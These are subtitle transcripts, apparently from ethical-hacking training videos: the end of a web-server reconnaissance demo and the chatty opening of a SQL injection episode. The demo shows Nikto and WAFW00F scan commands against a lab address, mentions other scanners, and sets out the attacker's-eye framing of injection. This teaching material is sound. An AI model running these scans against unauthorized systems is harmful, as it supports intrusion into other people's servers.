there.\n\n267\n00:12:10.321 --> 00:12:11.279\nThis, again,\n\n268\n00:12:11.279 --> 00:12:16.017\nwould be another tool that we could use\nto be able to achieve this end result.\n\n269\n00:12:16.017 --> 00:12:18.500\nWhat if we wanna go ahead and\ndo this in the the Linux world?\n\n270\n00:12:18.500 --> 00:12:21.899\nWe did this in the Windows world, but what\nif we wanna do this in the Linux world?\n\n271\n00:12:21.899 --> 00:12:25.486\nI mentioned in our discussion\na tool called Nikto.\n\n272\n00:12:25.486 --> 00:12:28.577\nI'm just gonna put the browser\nback to 100% there,\n\n273\n00:12:28.577 --> 00:12:31.110\nso it's kinda operating normally.\n\n274\n00:12:31.110 --> 00:12:32.470\nWe'll just minimize that.\n\n275\n00:12:32.470 --> 00:12:34.550\nWe mentioned a tool call Nikto.\n\n276\n00:12:36.250 --> 00:12:38.840\nSo let's come back up\nhere to our Linux box.\n\n277\n00:12:40.100 --> 00:12:44.770\nAnd let's go ahead and\nlet's use Nikto, that's N-I-K-T-O.\n\n278\n00:12:44.770 --> 00:12:50.788\nThis is another tool that runs\ninside of Linux, so we can call it.\n\n279\n00:12:50.788 --> 00:12:52.057\nJust gonna type nikto.\n\n280\n00:12:52.057 --> 00:12:54.164\nNiktu/nikto, whatever you wanna call it.\n\n281\n00:12:54.164 --> 00:12:57.608\nThen we're gonna type in our IP address,\nagain, so\n\n282\n00:12:57.608 --> 00:12:59.813\njust bear with me while I do that.\n\n283\n00:12:59.813 --> 00:13:01.066\nAnd actually, you know what I'm gonna do?\n\n284\n00:13:01.066 --> 00:13:01.864\nGive me just a second.\n\n285\n00:13:01.864 --> 00:13:04.760\nLet me just clear the screen so\nit's easy to see the difference here.\n\n286\n00:13:04.760 --> 00:13:06.214\nCuz everything is kinda stacking up.\n\n287\n00:13:06.214 --> 00:13:08.330\nIt's a little bit hard\nto see what I'm doing.\n\n288\n00:13:08.330 --> 00:13:09.710\nSo let's just clear that.\n\n289\n00:13:09.710 --> 00:13:11.700\nThe command to clear is just clear.\n\n290\n00:13:11.700 --> 00:13:13.520\nWe're used to CLS in Windows.\n\n291\n00:13:13.520 --> 00:13:17.757\nClear in Linux in CLS in Linux,\nclear in, whatever I just said.\n\n292\n00:13:17.757 --> 00:13:22.380\nCLS in Windows, clear in Lynx,\ncuz CLS doesn't always get recognized.\n\n293\n00:13:22.380 --> 00:13:24.280\nSo clear is what you wanna type there.\n\n294\n00:13:24.280 --> 00:13:31.668\nSo nikto, nikto -h 192.168.0.1,\n\n295\n00:13:31.668 --> 00:13:38.705\nand then we're gonna do output and\nthen scan.\n\n296\n00:13:38.705 --> 00:13:44.853\nLet's do, instead of output scan.txt,\nlet's just do output hack.txt.\n\n297\n00:13:44.853 --> 00:13:47.360\nIt doesn't matter what we call the file.\n\n298\n00:13:47.360 --> 00:13:50.760\nJust that I ran one earlier just to\nmake sure the resolution was good,\n\n299\n00:13:50.760 --> 00:13:53.430\nand I already got a file\nsitting there called scan.txt.\n\n300\n00:13:53.430 --> 00:13:55.030\nSo let's just do output.\n\n301\n00:13:55.030 --> 00:13:57.660\nOutput is the parameter that tells us,\nhey, output it.\n\n302\n00:13:57.660 --> 00:13:58.307\nOutput it to what?\n\n303\n00:13:58.307 --> 00:13:59.770\nOutput it to that file.\n\n304\n00:13:59.770 --> 00:14:01.160\nSo let's just run that.\n\n305\n00:14:01.160 --> 00:14:04.800\nYou're gonna see Nikto\nfire up here in a minute.\n\n306\n00:14:04.800 --> 00:14:06.680\nIt's gonna go out.\nIt's gonna scan.\n\n307\n00:14:06.680 --> 00:14:10.529\nAnd then once it's done, it'll generate\na report to the console, here.\n\n308\n00:14:10.529 --> 00:14:13.140\nIt's also gonna put it in so\nyou can see it's running there now.\n\n309\n00:14:13.140 --> 00:14:17.510\nIt's gonna put it into the file for\nus, and we could cap that file and\n\n310\n00:14:17.510 --> 00:14:18.290\njust open it up.\n\n311\n00:14:18.290 --> 00:14:20.412\nBut it's gonna look the same\nas the output to the console.\n\n312\n00:14:20.412 --> 00:14:21.108\nReally no issue there.\n\n313\n00:14:21.108 --> 00:14:26.300\nBut what we can do is see that the output\nhere gives us the target name and\n\n314\n00:14:26.300 --> 00:14:28.500\nthe information, the port.\n\n315\n00:14:28.500 --> 00:14:29.969\nIt does come back and register IIS 7.5.\n\n316\n00:14:29.969 --> 00:14:34.655\nSo we're starting to get more confidence\nthat that may be the right version as\n\n317\n00:14:34.655 --> 00:14:36.820\nwe use multiple tools.\n\n318\n00:14:36.820 --> 00:14:38.710\nAnd we're trying to zero in on that.\n\n319\n00:14:38.710 --> 00:14:42.560\nSo we're angling from different\nperspectives trying to cross reference.\n\n320\n00:14:42.560 --> 00:14:45.000\nWe get the same information\nfrom multiple tools.\n\n321\n00:14:45.000 --> 00:14:47.580\nWe're very likely on the right\ntrack with that version.\n\n322\n00:14:47.580 --> 00:14:48.765\nIf this came back and said, no, no.\n\n323\n00:14:48.765 --> 00:14:53.408\nThat's version 5.0 then\nmaybe httprint was off, and\n\n324\n00:14:53.408 --> 00:14:56.950\nwe'd have to do a little bit more work.\n\n325\n00:14:56.950 --> 00:15:01.227\nBut you can see here,\nwe're querying the asp.net information.\n\n326\n00:15:01.227 --> 00:15:04.369\nWe're getting back some\ninformation that most likely\n\n327\n00:15:04.369 --> 00:15:07.530\ntells us that it appears to\nbe a default IIS 7 install.\n\n328\n00:15:07.530 --> 00:15:10.220\nAnd so that's most likely gonna\nbe what we're looking at.\n\n329\n00:15:10.220 --> 00:15:14.520\nSo again, a 2008, or 2008 R2 box,\nsomething like that.\n\n330\n00:15:14.520 --> 00:15:17.983\nAnd we are going in.\n\n331\n00:15:17.983 --> 00:15:21.295\nIt looks like it tells us it's allowing\nOPTIONS, TRACE, GET, HEAD, POST.\n\n332\n00:15:21.295 --> 00:15:23.630\nAllowing all the standard methods.\n\n333\n00:15:23.630 --> 00:15:27.604\nIf we wanna see the file that we just\ncreated, if we do a simple ls, for list.\n\n334\n00:15:27.604 --> 00:15:31.920\nWe see the file was sitting right there,\nhack.txt, scan.txt.\n\n335\n00:15:31.920 --> 00:15:34.460\nWe could use cat in Linux.\n\n336\n00:15:34.460 --> 00:15:35.486\nSo just open it up.\n\n337\n00:15:35.486 --> 00:15:38.324\nWe could do a cat for\nthe name of the file.\n\n338\n00:15:38.324 --> 00:15:42.505\nAnd if we just do hack.txt,\nit'll just load the file, and force, and\n\n339\n00:15:42.505 --> 00:15:43.909\nshow us what's there.\n\n340\n00:15:43.909 --> 00:15:45.175\nSo again, it's the same content.\n\n341\n00:15:45.175 --> 00:15:51.039\nSame we get mirrored back to the console\nSo no issues there but we've done that.\n\n342\n00:15:51.039 --> 00:15:54.060\nNow, we can also go in.\n\n343\n00:15:54.060 --> 00:15:58.330\nI've done website mirroring in\none of our earlier conversations,\n\n344\n00:15:58.330 --> 00:16:01.400\none of the earlier hands\non demonstrations.\n\n345\n00:16:01.400 --> 00:16:04.880\nBut a website mirror would also be\na real cool thing to now follow up\n\n346\n00:16:04.880 --> 00:16:06.040\nwith on the next step.\n\n347\n00:16:06.040 --> 00:16:09.570\nA tool like HTTrack would\nbe a tool that I use.\n\n348\n00:16:09.570 --> 00:16:10.590\nAnd I did an extensive demo on.\n\n349\n00:16:10.590 --> 00:16:12.670\nWould be a pretty cool thing to do.\n\n350\n00:16:12.670 --> 00:16:16.980\nYou load this tool up, mirror the website,\nand then be able to interact with it.\n\n351\n00:16:16.980 --> 00:16:19.820\nWe're not gonna go through that demo\nagain here because number one it's very\n\n352\n00:16:19.820 --> 00:16:22.800\nextensive, takes a long time to set up and\ndo.\n\n353\n00:16:22.800 --> 00:16:26.170\nBut we've done a very thorough discussion\nof that and an actual demo of it.\n\n354\n00:16:26.170 --> 00:16:30.098\nSo I just encourage you to go back and\nwatch that in one of the earlier episodes.\n\n355\n00:16:30.098 --> 00:16:32.153\nBut that would be kind of the next\nstep here potentially, right?\n\n356\n00:16:32.153 --> 00:16:33.862\nWe take a look at maybe\nsomething like that.\n\n357\n00:16:33.862 --> 00:16:38.779\nNow there are also vulnerability\nframeworks that we\n\n358\n00:16:38.779 --> 00:16:41.840\ncould use to do some scanning.\n\n359\n00:16:41.840 --> 00:16:44.620\nWe mentioned w3af in the discussion.\n\n360\n00:16:44.620 --> 00:16:48.090\nYou could load up w3af and\nconfigure it and run it.\n\n361\n00:16:48.090 --> 00:16:51.160\nThat would be another step\nthat we may engage in.\n\n362\n00:16:51.160 --> 00:16:55.814\nAnd you could then scan the system with\nw3af going through the vulnerabilities\n\n363\n00:16:55.814 --> 00:16:56.796\nthat are found.\n\n364\n00:16:56.796 --> 00:16:57.940\nThere are many different ways to do that.\n\n365\n00:16:57.940 --> 00:17:00.389\nw3af is a Linux based framework.\n\n366\n00:17:00.389 --> 00:17:01.785\nSo you would do it through Calais.\n\n367\n00:17:01.785 --> 00:17:04.494\nBut you could then have a go in and\naudit for\n\n368\n00:17:04.494 --> 00:17:07.992\na bunch of potential exposures,\nvulnerabilities.\n\n369\n00:17:07.992 --> 00:17:11.393\nAnd if you do that and find them there\nthen we can get a report on that.\n\n370\n00:17:11.393 --> 00:17:12.978\nSo that may be something to consider.\n\n371\n00:17:12.978 --> 00:17:15.367\nThere are other ways to do that.\n\n372\n00:17:15.367 --> 00:17:19.157\nThere are both Linux and UNIX based,\nor Linux and Windows based, excuse me,\n\n373\n00:17:19.157 --> 00:17:20.743\nframeworks that could be used.\n\n374\n00:17:20.743 --> 00:17:22.784\nSo that's something to think about.\n\n375\n00:17:22.784 --> 00:17:24.630\nWe could go in.\n\n376\n00:17:26.220 --> 00:17:29.400\nAnd we could also analyze web apps.\n\n377\n00:17:29.400 --> 00:17:35.800\nWe may wanna see whether or\nnot the app is behind a firewall.\n\n378\n00:17:35.800 --> 00:17:38.250\nAnd if it is, if there is a firewall,\nhow do we know about that?\n\n379\n00:17:38.250 --> 00:17:39.520\nSo let me show you one other thing.\n\n380\n00:17:39.520 --> 00:17:41.070\nLet me just clear\nthe screen one more time.\n\n381\n00:17:41.070 --> 00:17:44.980\nWhoops, let me click in here and clear the\nscreen one more time, sorry about that.\n\n382\n00:17:44.980 --> 00:17:49.970\nAnd let's go in and let's take a look at\nsomething that is kinda cool, wafw and\n\n383\n00:17:49.970 --> 00:17:55.389\nthen let's just go in\n\n384\n00:17:55.389 --> 00:18:00.510\nand do, intranet.\n\n385\n00:18:03.070 --> 00:18:04.561\nOkay?\nSo WAFW00F, right?\n\n386\n00:18:04.561 --> 00:18:05.690\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n387\n00:18:05.690 --> 00:18:08.720\n&gt;&gt; Web Application Firewall W00F\n\n388\n00:18:08.720 --> 00:18:11.980\nis a Web Application Firewall detection so\nagain it runs in Linux.\n\n389\n00:18:11.980 --> 00:18:15.140\nThere are Windows based\nversion of tools like this.\n\n390\n00:18:15.140 --> 00:18:17.360\nBut it goes out and\n\n391\n00:18:17.360 --> 00:18:21.250\nit finds that this web site seems to\nbe behind a web application firewall.\n\n392\n00:18:21.250 --> 00:18:22.720\nIt's probing to see whether or\n\n393\n00:18:22.720 --> 00:18:26.810\nnot there's evidence of a web application\nfirewall being deployed there.\n\n394\n00:18:26.810 --> 00:18:29.800\nAnd if there is then it obviously\nwill come back and tell us.\n\n395\n00:18:29.800 --> 00:18:34.543\nNow keep in mind, this is just one\nsmall piece again of the bigger puzzle.\n\n396\n00:18:34.543 --> 00:18:35.868\nWe're nibbling at the edges, right?\n\n397\n00:18:35.868 --> 00:18:41.343\nTrying to, through reconnaissance and\nthrough footprinting,\n\n398\n00:18:41.343 --> 00:18:45.026\nand through various varieties of methods,\n\n399\n00:18:45.026 --> 00:18:50.120\nwe are trying to establish and\nbuild the picture, right?\n\n400\n00:18:50.120 --> 00:18:53.680\nOf what is going on in the system and\nunderstand what may or\n\n401\n00:18:53.680 --> 00:18:55.050\nmay not be the case.\n\n402\n00:18:55.050 --> 00:19:00.110\nSo for instance, if we were to\ntake a look at another website and\n\n403\n00:19:00.110 --> 00:19:05.210\nsee whether or not it is running behind\nthere we may get a different response.\n\n404\n00:19:05.210 --> 00:19:09.070\nSo let's take a look at\nsomething like that, right?\n\n405\n00:19:10.110 --> 00:19:11.060\nLet's check that one.\n\n406\n00:19:11.060 --> 00:19:13.200\nAnd this may or may not come up.\n\n407\n00:19:13.200 --> 00:19:15.080\nSee there it says basically error, right?\n\n408\n00:19:15.080 --> 00:19:16.280\nIt appears to be down.\n\n409\n00:19:16.280 --> 00:19:18.050\nSo the website is either not there.\n\n410\n00:19:18.050 --> 00:19:20.410\nOr there's nothing there\nin the first place.\n\n411\n00:19:20.410 --> 00:19:25.090\nSo we'll probe different addresses,\ntrying to figure out what may or\n\n412\n00:19:25.090 --> 00:19:27.500\nmay not seem to be active.\n\n413\n00:19:27.500 --> 00:19:28.740\nAnd as a result, whether or\n\n414\n00:19:28.740 --> 00:19:32.640\nnot we can find that it is running\nbehind a web application firewall.\n\n415\n00:19:32.640 --> 00:19:34.620\nSo kinda interesting stuff, right?\n\n416\n00:19:34.620 --> 00:19:35.120\n&gt;&gt; Very interesting.\n\n417\n00:19:35.120 --> 00:19:36.780\n&gt;&gt; So a lot of different opportunities for\n\n418\n00:19:36.780 --> 00:19:39.930\nus to stitch together\nvarious pieces of the puzzle.\n\n419\n00:19:39.930 --> 00:19:44.380\nTrying to look at how we could hack not\njust web applications, but web servers.\n\n420\n00:19:44.380 --> 00:19:45.790\nKind of a combination of both.\n\n421\n00:19:45.790 --> 00:19:47.330\nWe did some banner grabbing.\n\n422\n00:19:47.330 --> 00:19:48.610\nDid some directory traversal.\n\n423\n00:19:48.610 --> 00:19:50.430\nThat's more on the web server side.\n\n424\n00:19:50.430 --> 00:19:54.460\nWe did the web application\nfirewall to look at web apps.\n\n425\n00:19:54.460 --> 00:19:57.910\nWe went ahead and\nlooked at or used Nic2 and\n\n426\n00:19:57.910 --> 00:20:02.380\nhttprint to get information\nabout stuff there, right.\n\n427\n00:20:02.380 --> 00:20:04.430\nSo there's a combination of things we did.\n\n428\n00:20:04.430 --> 00:20:07.870\nBut remember, we're talking about\nthose concentric rings like I tried\n\n429\n00:20:07.870 --> 00:20:10.100\nto visually explain for you earlier.\n\n430\n00:20:10.100 --> 00:20:13.420\nIn the last episode we started\ntalking about hacking web apps.\n\n431\n00:20:13.420 --> 00:20:16.700\nWhere we see it as hacking the web server,\nthe web app, and\n\n432\n00:20:16.700 --> 00:20:19.155\nthe SQL command injection and\nthe server sits at the middle.\n\n433\n00:20:19.155 --> 00:20:20.770\nThe app sits around it.\n\n434\n00:20:20.770 --> 00:20:24.100\nAnd then the injection attacks are on the\nperiphery cuz they are coming in through\n\n435\n00:20:24.100 --> 00:20:26.140\nthe application down\ntowards the SQL server.\n\n436\n00:20:26.140 --> 00:20:29.420\nAnd probably even have a smaller circle\nbelow that with the database, right?\n\n437\n00:20:29.420 --> 00:20:32.669\nWhich is what we target\nwith those SQL injections.\n\n438\n00:20:32.669 --> 00:20:34.589\nSo keep in mind that there's\nlots of ways to do this.\n\n439\n00:20:34.589 --> 00:20:40.638\nAnd although it's very small,\njust very quick, kind of easy to dissect.\n\n440\n00:20:40.638 --> 00:20:44.212\nAnd very, very just small little\nsnippets of pieces here and\n\n441\n00:20:44.212 --> 00:20:46.046\nthere in this demonstration.\n\n442\n00:20:46.046 --> 00:20:48.306\nWe're linking together lots\nof different activities and\n\n443\n00:20:48.306 --> 00:20:51.280\nthoughts that we've been through\nin other areas more extensively.\n\n444\n00:20:51.280 --> 00:20:53.580\nAnd just really making\nthem specific to the web.\n\n445\n00:20:53.580 --> 00:20:55.600\nAnd showing you examples\nof what you may do.\n\n446\n00:20:55.600 --> 00:20:57.964\nHopefully showed you some new tools\nyou may or may not be aware of.\n\n447\n00:20:57.964 --> 00:21:00.334\nWAFW00F is always a good one,\na lot of people don't know about that one.\n\n448\n00:21:00.334 --> 00:21:01.412\n&gt;&gt; [LAUGH]\n&gt;&gt; That's always fun.\n\n449\n00:21:01.412 --> 00:21:04.030\nBut Nic2 is a good tool, certainly.\n\n450\n00:21:05.640 --> 00:21:08.510\nAMAP is a good tool as well,\nall the different ones we talked about.\n\n451\n00:21:08.510 --> 00:21:11.050\nJust a lot of cool things\nthat you can play with there.\n\n452\n00:21:11.050 --> 00:21:13.080\nRemember, we did talk about HTTrack.\n\n453\n00:21:13.080 --> 00:21:16.120\nI didn't do the demo to map the website\nit mirrored, as I explained to you.\n\n454\n00:21:16.120 --> 00:21:17.580\nAlthough that would be a next step there.\n\n455\n00:21:17.580 --> 00:21:19.800\nBut we've done that already\nin another episode.\n\n456\n00:21:19.800 --> 00:21:23.260\nWe're just not gonna reinvest the time and\nenergy to produce it again for\n\n457\n00:21:23.260 --> 00:21:25.270\nyou twice when you're gonna\nsee the same outcome.\n\n458\n00:21:25.270 --> 00:21:27.100\nBut we definitely want you to\nthink about going back and\n\n459\n00:21:27.100 --> 00:21:30.250\nlooking at that one as well,\nlinking it to this concept.\n\n460\n00:21:30.250 --> 00:21:32.960\nBecause that would be a major\nstep in the process right there.\n\n461\n00:21:32.960 --> 00:21:34.730\nRight.\nIs thinking about that also.\n\n462\n00:21:34.730 --> 00:21:36.210\nSo just some things to consider.\n\n463\n00:21:36.210 --> 00:21:37.090\n&gt;&gt; All right, Adam.\n\n464\n00:21:37.090 --> 00:21:38.790\nWe thank you for that great hands on look.\n\n465\n00:21:38.790 --> 00:21:43.890\nA lot of the tools we could potentially\nbe using to attack web applications and\n\n466\n00:21:43.890 --> 00:21:44.510\nweb servers.\n\n467\n00:21:44.510 --> 00:21:45.520\nSo we thank you for that.\n\n468\n00:21:45.520 --> 00:21:47.150\nWe hope everybody out\nthere enjoyed watching.\n\n469\n00:21:47.150 --> 00:21:49.666\nSigning off for ITProTV I'm Mike Rodrick.\n\n470\n00:21:49.666 --> 00:21:50.311\n&gt;&gt; Woof Woof.\n\n471\n00:21:50.311 --> 00:21:51.454\n&gt;&gt; And we'll see you next time.\n\n472\n00:21:51.454 --> 00:21:51.954\n[LAUGH]\n\n473\n00:21:51.954 --> 00:22:01.554\n[MUSIC]\n\n",

[LAUGH] &gt;&gt; Cuz I need to be\nup and paying attention for this.\n\n22\n00:01:00.844 --> 00:01:03.060\n&gt;&gt; [LAUGH]\n&gt;&gt; Forget about the SQL injection,\n\n23\n00:01:03.060 --> 00:01:04.752\nI gotta actually know\nwhat I'm talking about.\n\n24\n00:01:04.752 --> 00:01:06.079\n&gt;&gt; [LAUGH]\n&gt;&gt; No, we are gonna talk about\n\n25\n00:01:06.079 --> 00:01:06.617\nSQL injection.\n\n26\n00:01:06.617 --> 00:01:11.650\nAnd you know, as Mike was saying, this is\na very common set of attacks we see today.\n\n27\n00:01:11.650 --> 00:01:15.120\nAlmost, not quite everything, but\nalmost everything we do on the web\n\n28\n00:01:15.120 --> 00:01:18.500\nis going to back end into\na database at some point.\n\n29\n00:01:18.500 --> 00:01:22.604\nAnd because of that as we'd be talking\nabout in some of our prior episodes,\n\n30\n00:01:22.604 --> 00:01:27.293\nin hacking web services, web servers, web\napps, all of those kinds of things that we\n\n31\n00:01:27.293 --> 00:01:31.331\ntalked about, you were gonna see this\nbeing the end of the road in the sense\n\n32\n00:01:31.331 --> 00:01:35.305\nthat we're gonna try to execute these\nattacks through those systems and\n\n33\n00:01:35.305 --> 00:01:39.842\nthen hit this database, this mythical\ndatabase sitting on the back end, right?\n\n34\n00:01:39.842 --> 00:01:44.762\nAnd if we can get to database nirvana,\nwe need like the, you know like,\n\n35\n00:01:44.762 --> 00:01:46.076\nremember Enigma?\n\n36\n00:01:46.076 --> 00:01:46.674\n&gt;&gt; Yeah.\n&gt;&gt; So we\n\n37\n00:01:46.674 --> 00:01:48.965\nneed like that music in the background.\n\n38\n00:01:48.965 --> 00:01:50.440\n&gt;&gt; [LAUGH]\n&gt;&gt; We didn't tell Megan ahead of time or\n\n39\n00:01:50.440 --> 00:01:51.510\nI'm sure she would have done that.\n\n40\n00:01:51.510 --> 00:01:53.820\nThat would have been like the Gregorian\nchanting when I did that.\n\n41\n00:01:53.820 --> 00:01:55.013\nThat would have been awesome.\n\n42\n00:01:55.013 --> 00:01:56.173\n&gt;&gt; [LAUGH]\n&gt;&gt; Right, so\n\n43\n00:01:56.173 --> 00:02:00.090\nwe're to climb the mountain and\nattempt to get database nirvana.\n\n44\n00:02:00.090 --> 00:02:03.310\nAnd if we can do that,\nwe're gonna be able to do crazy,\n\n45\n00:02:03.310 --> 00:02:07.161\ncrazy stuff that's gonna allow us\nto pull data out of databases,\n\n46\n00:02:07.161 --> 00:02:11.449\npotentially put data into databases,\nmanipulate data that's there.\n\n47\n00:02:11.449 --> 00:02:14.470\nIt's just a database party is what it is,\nright?\n\n48\n00:02:14.470 --> 00:02:18.530\nAnd so what we ultimately want to figure\nout how to do is from the attacker\n\n49\n00:02:18.530 --> 00:02:21.490\nperspective, right, because we always want\nto learn about the attacks first, and\n\n50\n00:02:21.490 --> 00:02:24.940\nthen we want to learn about ways in\nwhich we may ultimately stop them.\n\n51\n00:02:24.940 --> 00:02:28.020\nWe wanna understand a little bit more\nabout SQL injection, and we're gonna talk\n\n52\n00:02:28.020 --> 00:02:31.960\na bit about it here, talk about some\nof the methodologies the attack types.\n\n53\n00:02:31.960 --> 00:02:34.710\nShow you a little exploit\ncode along the way, and\n\n54\n00:02:34.710 --> 00:02:38.420\nif you're really, really good,\nreally good, then I'm gonna show you how\n\n55\n00:02:38.420 --> 00:02:41.870\nHad to actually do SQL injection\nin one of our upcoming demos.\n\n56\n00:02:41.870 --> 00:02:43.620\nAnd if you're not,\nI'm gonna show you anyway but\n\n57\n00:02:43.620 --> 00:02:45.060\nwe're gonna black it out on the screen so\n\n58\n00:02:45.060 --> 00:02:48.120\nyou'll only hear me talking about it, but\nyou won't actually be able to see it.\n\n59\n00:02:48.120 --> 00:02:49.000\n&gt;&gt; Wouldn't that be cruel?\n\n60\n00:02:49.000 --> 00:02:49.660\n&gt;&gt; That would be unusual.\n\n61\n00:02:49.660 --> 00:02:50.470\n&gt;&gt; That would be punishment.\n\n62\n00:02:50.470 --> 00:02:52.540\n&gt;&gt; That would be cruel and unusual, right?\n\n63\n00:02:52.540 --> 00:02:54.966\nSo you better be good for\ngoodness sake, is all I have to say.\n\n64\n00:02:54.966 --> 00:02:55.666\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, so\n\n65\n00:02:55.666 --> 00:02:58.496\nlet's start by talking a little bit\nabout SQL injection, what it is.\n\n66\n00:02:58.496 --> 00:03:02.264\nI know that we have put together\na nice little summary document for\n\n67\n00:03:02.264 --> 00:03:05.690\nall of our great audience\nmembers out there.\n\n68\n00:03:05.690 --> 00:03:09.290\nAnd when we talk about SQL injection,\nwe may wanna, yeah.\n\n69\n00:03:09.290 --> 00:03:10.400\nI was gonna say, you roll up or\n\n70\n00:03:10.400 --> 00:03:13.760\nmaybe go full screen because I'm\nblocking like part of what's there.\n\n71\n00:03:13.760 --> 00:03:17.030\nSo does it freak you out when I'm\na disembodied voice talking to you?\n\n72\n00:03:17.030 --> 00:03:19.950\nI was meant to ask you that, like I\nknow the people out there they're like,\n\n73\n00:03:19.950 --> 00:03:21.870\nwhatever I just wanna know,\nwe don't really care.\n\n74\n00:03:21.870 --> 00:03:24.350\nBut you hear somebody talking to you,\n\n75\n00:03:24.350 --> 00:03:27.520\nthis is the point in the scary\nmovie where smart people leave.\n\n76\n00:03:27.520 --> 00:03:28.610\n&gt;&gt; Yes.\n&gt;&gt; And then the bad,\n\n77\n00:03:28.610 --> 00:03:30.900\nthe stupid people that don't pay\nattention get killed, right?\n\n78\n00:03:30.900 --> 00:03:31.520\n&gt;&gt; Let's go check it out.\n\n79\n00:03:31.520 --> 00:03:32.601\nLet's walk towards the noise.\n\n80\n00:03:32.601 --> 00:03:34.830\nYes exactly, I mean,\nif you think about that, right,\n\n81\n00:03:34.830 --> 00:03:37.304\nI mean that's what we are essentially\nsetting people up for.\n\n82\n00:03:37.304 --> 00:03:41.881\nSo when the hand reaches out of\nthe monitor, right, and is coming for you,\n\n83\n00:03:41.881 --> 00:03:44.652\ndon't be that guy or\nthat girl like run away.\n\n84\n00:03:44.652 --> 00:03:48.857\nRight, run away quickly or make sure you\nthrow something in front of yourself,\n\n85\n00:03:48.857 --> 00:03:53.235\nlike an intern perhaps in order to make\nsure that you're actually able to escape.\n\n86\n00:03:53.235 --> 00:03:54.733\n&gt;&gt; [LAUGH]\n&gt;&gt; And don't wear a red shirt,\n\n87\n00:03:54.733 --> 00:03:56.522\ncuz that's like the kiss of death.\n\n88\n00:03:56.522 --> 00:03:59.939\nYou're the guy or the girl on the landing\nparty and the other rock is gonna come and\n\n89\n00:03:59.939 --> 00:04:01.712\nfall on you or something crazy like that.\n\n90\n00:04:01.712 --> 00:04:03.850\n&gt;&gt; You're either smashed or eaten one.\n\n91\n00:04:03.850 --> 00:04:05.840\n&gt;&gt; Yeah, and you know there must have\nbeen, I wonder, I always wonder.\n\n92\n00:04:05.840 --> 00:04:07.590\nThis is all random aside by the way,\nfor the episode,\n\n93\n00:04:07.590 --> 00:04:10.170\nin case you are not been\nthrough these with us before.\n\n94\n00:04:10.170 --> 00:04:10.970\nThis is where Mike and\n\n95\n00:04:10.970 --> 00:04:14.010\nI talk about totally inane garbage for\nabout five minutes.\n\n96\n00:04:14.010 --> 00:04:16.020\nJust because we're, well, we can.\n\n97\n00:04:16.020 --> 00:04:17.840\n&gt;&gt; We have to.\n&gt;&gt; Which is why because you know you\n\n98\n00:04:17.840 --> 00:04:21.620\nhave to listen to us cuz you want to know\nthis stuff so I can talk about craziness,\n\n99\n00:04:21.620 --> 00:04:23.100\nand then we can get down to business.\n\n100\n00:04:23.100 --> 00:04:27.060\nSo I'm just wondering if there was\nactually a conscious choice to make red\n\n101\n00:04:27.060 --> 00:04:30.810\nthe color or if it was just random, like\nthe extra guy that was wearing the shirt,\n\n102\n00:04:30.810 --> 00:04:33.190\nthey only had red left that\nday cuz he got there last.\n\n103\n00:04:33.190 --> 00:04:34.610\nShould I put this on?\n\n104\n00:04:34.610 --> 00:04:36.467\nAnd then by the way, we're killing you.\n\n105\n00:04:36.467 --> 00:04:37.970\nAnd so now it just became a thing.\n\n106\n00:04:37.970 --> 00:04:41.480\n&gt;&gt; I think so, nobody looks good in\nbright red colors it was left for the-\n\n107\n00:04:41.480 --> 00:04:42.740\n&gt;&gt; Yeah like you're only gonna be on\n\n108\n00:04:42.740 --> 00:04:45.440\ncamera for two seconds anyway so\nwe'll just knock you off, but\n\n109\n00:04:45.440 --> 00:04:46.250\nthat's what you get to wear.\n\n110\n00:04:46.250 --> 00:04:46.980\n&gt;&gt; That's it.\n\n111\n00:04:46.980 --> 00:04:48.510\n&gt;&gt; You know,\nsomething like that would be so\n\n112\n00:04:48.510 --> 00:04:51.014\nrandom, but yet probably the exact\nway it happened I'm thinking.\n\n113\n00:04:51.014 --> 00:04:54.483\nSo that's the magic behind\nHollywood right there.\n\n114\n00:04:54.483 --> 00:04:56.810\nAll right, so\nlet's turn that into SQL injection.\n\n115\n00:04:56.810 --> 00:04:59.460\nI have no idea how to do that, so\nwe're just gonna jump right back in and\n\n116\n00:04:59.460 --> 00:05:01.800\nactually segue totally\ninto our conversation.\n\n117\n00:05:01.800 --> 00:05:03.140\nSo what is SQL injection?\n\n118\n00:05:03.140 --> 00:05:03.980\nWhy is it important?\n\n119\n00:05:03.980 --> 00:05:04.780\nWhat does it do?\n\n120\n00:05:04.780 --> 00:05:07.590\nWe thought we'd start out with\na little overview in terms of\n\n121\n00:05:07.590 --> 00:05:09.090\nthis idea of the technique.\n\n122\n00:05:09.090 --> 00:05:09.750\nWhat is it?\n\n123\n00:05:09.750 --> 00:05:10.500\nHow do we use it?\n\n124\n00:05:10.500 --> 00:05:11.660\nWhy is it important?\n\n125\n00:05:11.660 --> 00:05:14.590\nWe talked about it in prior episodes,\nbut the idea here is that we're taking\n\n126\n00:05:14.590 --> 00:05:18.480\nadvantage of the lack of boundary\nchecking, lack of validation,\n\n127\n00:05:18.480 --> 00:05:23.130\nlack of understanding of what this\ncommand or this SQL code will do.\n\n128\n00:05:23.130 --> 00:05:26.460\nAnd because we're not paying attention\nto that, we're able to, in theory,\n\n129\n00:05:26.460 --> 00:05:27.620\nsneak it in.\n\n130\n00:05:27.620 --> 00:05:28.830\nAnd when we sneak it in,\n\n131\n00:05:28.830 --> 00:05:32.940\nwe're able to then get some sort of\noutput that we may be looking for.\n\n132\n00:05:32.940 --> 00:05:36.430\nSo it's really a question of\nimplementation of controls that prevent\n\n133\n00:05:36.430 --> 00:05:37.100\nSQL attacks.\n\n134\n00:05:37.100 --> 00:05:40.460\nSo we've talked a lot about this sort\nof injection attacks generically cuz\n\n135\n00:05:40.460 --> 00:05:43.770\nnot all injection attacks\nare necessarily SQL driven.\n\n136\n00:05:43.770 --> 00:05:46.890\nWe do have LDAP injection,\nwe do have file injection.\n\n137\n00:05:46.890 --> 00:05:49.790\nWe have a bunch of different stuff as\nwe talk about it in our hacking web\n\n138\n00:05:49.790 --> 00:05:53.320\napplication conversation, went\nthrough a series of attacks there, and\n\n139\n00:05:53.320 --> 00:05:56.350\nSQL injection was one of them,\nvery large category.\n\n140\n00:05:56.350 --> 00:05:59.100\nYou been a lot of times often hear\npeople say, well injection attacks,\n\n141\n00:05:59.100 --> 00:06:00.670\nall you do is inject SQL code.\n\n142\n00:06:00.670 --> 00:06:05.920\nNo, there's a lot of other stuff you\ncan do, but this is a very big section.\n\n143\n00:06:05.920 --> 00:06:09.700\nAs you pointed out, a very big focal\npoint for injection attack, right?\n\n144\n00:06:09.700 --> 00:06:10.682\nSo just be aware 